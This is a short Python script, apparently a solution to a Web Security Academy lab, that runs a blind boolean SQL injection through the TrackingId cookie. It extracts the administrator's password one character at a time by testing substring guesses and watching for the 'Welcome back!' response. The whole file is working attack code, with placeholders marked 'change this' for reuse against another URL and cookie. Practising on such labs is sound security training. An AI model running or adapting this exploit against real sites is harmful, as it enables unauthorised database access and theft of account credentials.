#Change url and cookie variables.

import requests
data = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',\
        '1','2','3','4','5','6','7','8','9','0']
url = "https://ac851f071ebba3d4c0bf1c89001700ac.web-security-academy.net/filter?category=Pets" #change this
cookie1 = "Vp73FPxbBa5VFPdF" #change this
actual_password = ''
for i in range(1,21):
  for j in data:
    full_cookie = cookie1+"' and (select substring(password,{},1) from users where username='administrator' limit 1) ='{}".format(i,j)
    fin_cook = {
        "TrackingId":full_cookie
    }
    r = requests.get(url,cookies=fin_cook)
    print("Trying {} with this {}".format(i,j))
    if "Welcome back!" in r.text:
      actual_password = actual_password+j #actualpassword+=j
      break
print(actual_password)
              
